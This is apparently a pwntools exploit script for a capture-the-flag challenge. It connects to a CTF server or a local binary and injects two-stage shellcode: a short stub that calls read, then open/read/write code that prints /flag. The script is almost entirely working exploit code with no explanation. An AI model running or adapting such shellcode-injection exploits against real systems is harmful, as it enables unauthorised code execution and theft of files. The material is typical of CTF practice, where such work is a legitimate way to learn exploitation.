from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

file_name = './pwn_patched'
libc_name = './libc.so.6'

elf = ELF(file_name)
context.binary = elf
libc = ELF(libc_name)

gdb_   = 1 if ('gdb' in sys.argv)        else 0
switch = 1 if ('remote' in sys.argv)     else 0
debug  = 0 if ('deoff'  in sys.argv)     else 1
error  = 1 if ('error'  in sys.argv)     else 0

if switch:
    target = 'nc1.ctfplus.cn'
    port   = 36752
    p = remote(target, port)
else:
    p = process(file_name)

if debug:
    context(log_level='debug')

if error:
    context(log_level='error')

bps = [
# 0x1234,
# 'main',
# (0xe3b31, 'libc'), 
# ('system', 'libc')
#0x1480
]

if gdb_ and switch == 0:
    gdb_cmd = ''
    for b in bps:
       if isinstance(b, int):
           gdb_cmd += f"b *$rebase({hex(b)})\n"
       elif isinstance(b, str):
           gdb_cmd += f"b {b}\n"
       elif isinstance(b, tuple) and len(b) == 2 and b[1] == 'libc':
           if 'libc' in locals() and libc:
                anchor = 'printf' if 'printf' in libc.sym else '__libc_start_main'
                anchor_off = libc.sym[anchor]
                target = libc.sym[b[0]] if isinstance(b[0], str) else b[0]
                gdb_cmd += f"b *&{anchor} - {hex(anchor_off)} + {hex(target)}\n"
           else:
                log.warning("未加载 Libc,跳过 Libc 断点")
    gdb.attach(p,gdb_cmd)
    pause()

def s(data):             return p.send(data)
def sa(delim, data):     return p.sendafter(delim, data)
def sl(data):            return p.sendline(data)
def sla(delim, data):    return p.sendlineafter(delim, data)
def r(numb=4096):        return p.recv(numb)
def ru(delim, drop=True):return p.recvuntil(delim, drop)
def rl():                return p.recvline()
def ra(t=None):          return p.recvall(timeout=t)
def cl():                return p.close()
def it():                return p.interactive()
def uu64(data):          return u64(data.ljust(8, b'\x00'))
def search(s, f=None):   return next((f or libc).search(s if isinstance(s, bytes) else s.encode()))
def lg(name, data):      return log.success(name + ': ' + (hex(data) if isinstance(data, int) else data.decode(errors='ignore') if isinstance(data, bytes) else str(data)))
def menu(idx, pmt=b'>'): return sla(pmt, str(idx).encode())
def ga(delim=b'\n', name='Leak'):    return [lg(f'{name}[{i}]', x) or x for i, x in enumerate([int(a, 16) for a in re.findall(b'0x[0-9a-fA-F]+', ru(delim))])]
def ntlb(leak, offset, name='Libc'):  return setattr(libc, 'address', leak - (libc.sym[offset] if isinstance(offset, str) else offset)) or lg(name, libc.address)
def ntpie(leak, offset, name='PIE'):  return setattr(elf, 'address', leak - (elf.sym[offset] if isinstance(offset, str) else offset)) or lg(name, elf.address)
def fill(num, content=b'A'):          return (content.encode() if isinstance(content, str) else content) * num

#################################################################################
stage1_asm = '''
    pop rdx
    pop rdx
    pop rsi
    xchg eax, ebx
    syscall
'''
stage1 = asm(stage1_asm)
sa(b"Try contacting Geek HQ",stage1)
orw_payload = shellcraft.open('/flag') 
orw_payload += shellcraft.read('rax', 'rsp', 0x100)
orw_payload += shellcraft.write(1, 'rsp', 0x100)   
padding = b'A' * 6 
stage2 = padding + asm(orw_payload)
s(stage2)
it()


